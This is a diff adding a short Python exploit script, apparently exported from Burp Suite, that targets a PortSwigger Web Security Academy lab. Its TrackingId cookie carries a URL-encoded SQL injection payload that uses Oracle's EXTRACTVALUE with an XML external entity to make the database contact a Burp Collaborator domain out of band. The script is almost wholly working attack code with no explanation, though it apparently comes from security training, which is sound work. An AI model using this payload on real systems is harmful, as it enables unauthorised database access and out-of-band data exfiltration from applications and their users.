@@ -1,0 +1,7 @@
+#!/usr/bin/python3
+# burp collaborator: 738fipwlvx73h5amrvcms617fylp9fx4.oastify.com
+import requests
+burp0_url = "https://0ae200c403cf95a180ca03ff00c200b5.web-security-academy.net:443/"
+burp0_cookies = {"TrackingId": "XfMCWBQNte8KcSZO'%20UNION%20SELECT%20EXTRACTVALUE(xmltype('%3c%3fxml%20version%3d%221.0%22%20encoding%3d%22UTF-8%22%3f%3e%3c!DOCTYPE%20root%20%5b%20%3c!ENTITY%20%25%20remote%20SYSTEM%20%22http%3a%2f%2f738fipwlvx73h5amrvcms617fylp9fx4.oastify.com%2f%22%3e%20%25remote%3b%5d%3e')%2c'%2fl')%20FROM%20dual--", "session": "56hPu7kX10hZwlbvFerBqIoj20nwH77x"}
+burp0_headers = {"Sec-Ch-Ua": "\"Not-A.Brand\";v=\"24\", \"Chromium\";v=\"146\"", "Sec-Ch-Ua-Mobile": "?0", "Sec-Ch-Ua-Platform": "\"Windows\"", "Accept-Language": "en-US,en;q=0.9", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Referer": "https://0ae200c403cf95a180ca03ff00c200b5.web-security-academy.net/", "Accept-Encoding": "gzip, deflate, br", "Priority": "u=0, i"}
+requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)
